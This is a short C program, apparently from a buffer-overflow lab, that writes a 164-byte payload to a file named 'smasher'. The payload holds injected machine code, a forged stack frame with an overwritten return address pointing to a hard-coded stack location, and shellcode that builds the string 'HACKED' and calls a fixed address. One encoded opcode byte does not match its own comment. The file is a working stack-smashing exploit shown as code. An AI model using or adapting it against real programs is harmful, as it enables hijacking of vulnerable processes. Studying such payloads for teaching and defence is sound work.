#include <stdlib.h>
#include <stdio.h>
#include <string.h>


static char code[164] = { 
// quarto byte igual a 0x42(66 em bin√°rio) para mudar o retval

                       0xc7, 0x45, 0xfc, 0x42, 0x00, 0x00, 0x00,   		   	//movl   $0x42,-0x4(%rbp)
                       0x8b, 0x45, 0xfc,                        			//mov    -0x4(%rbp),%eax
		       0xc9,							       // leavq
		       0xc3,                                                           // retq               
		       0,0,0,0,0,0,0,0,0,0,
		       0,0,0,0,0,0,0,0,0,0,
		       0xc0, 0xde, 0xff, 0xff, 0xff, 0x7f, 0x00, 0x00,		      // parameter (char *)
		       0x05, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00,                // parameter (int)
		       0xc0, 0xde, 0xff, 0xff, 0xff, 0x7f, 0x00, 0x00,                // static link 
		       0x00, 0xdd, 0xff, 0xff, 0xff, 0x7f, 0x00, 0x00,                 // return address
			0xc7, 0x45, 0xfc, 0x00, 0x00, 0x00, 0x00,			// movl   $0x0,-0x4(%rbp)
			0xc6, 0x85, 0x48, 0xfe, 0xff, 0xff, 0x48,			// movb   $0x48,-0x1b8(%rbp)
			0xc6, 0x85, 0x49, 0xfe, 0xff, 0xff, 0x41,			// movb   $0x41,-0x1b7(%rbp)
			0xc6, 0x85, 0x4a, 0xfe, 0xff, 0xff, 0x43,			// movb   $0x43,-0x1b6(%rbp)
			0xc6, 0x85, 0x4b, 0xfe, 0xff, 0xff, 0x4b,			// 	movb   $0x4b,-0x1b5(%rbp)
			0xc6, 0x85, 0x4c, 0xfe, 0xff, 0xff, 0x45,			// movb   $0x45,-0x1b4(%rbp)
			0xc7, 0x85, 0x4d, 0xfe, 0xff, 0xff, 0x44,			// movb   $0x44,-0x1b3(%rbp)
			0xc6, 0x85, 0x4e, 0xfe, 0xff, 0xff, 0x0a,			// movb   $0xa,-0x1b2(%rbp)
			0xc6, 0x85, 0x4f, 0xfe, 0xff, 0xff, 0x00,			// movb   $0x0,-0x1b1(%rbp)
			0x48, 0x8d, 0x85, 0x48, 0xfe, 0xff, 0xff,			// lea    -0x1b8(%rbp),%rax
			0x48, 0xba, 0xec, 0x28, 0x60, 0x67, 0xff,			// movabs $0x7fff676028ec,%rdx
			0x7f, 0x00, 0x00,						
			0x48, 0x89, 0xc7,						// mov    %rax,%rdi
			0xb8, 0x00, 0x00, 0x00, 0x00,					// mov    $0x0,%eax
			0xff, 0xd2,							// callq  *%rdx
			0x8b, 0x45, 0xfc,						// mov    -0x4(%rbp),%eax
			0xc9,								// leaveq
			0xc3								// retq
};

int main(int argc, const char * argv[])
{ 
    FILE *badfile;
    badfile = fopen("smasher", "w");
    fwrite(code, sizeof(char), sizeof(code), badfile);
    printf("SIZE=%lu\n",sizeof(code));
  return 0;
}
